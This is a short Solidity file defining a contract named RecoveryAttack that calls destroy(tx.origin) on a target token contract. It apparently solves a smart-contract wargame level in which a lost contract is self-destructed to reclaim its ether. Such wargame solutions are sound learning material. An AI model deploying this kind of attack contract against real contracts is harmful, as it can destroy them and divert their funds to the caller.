pragma solidity ^0.6.0;

interface SimpleToken {
    // allow transfers of tokens
    function transfer(address, uint256) external;

    // clean up after ourselves
    function destroy(address) external;
}

contract RecoveryAttack {
    SimpleToken public simpleToken;

    constructor(address _contractAddress) public {
        simpleToken = SimpleToken(_contractAddress);
    }

    function transfer() public {
        simpleToken.destroy(tx.origin);
    }
}
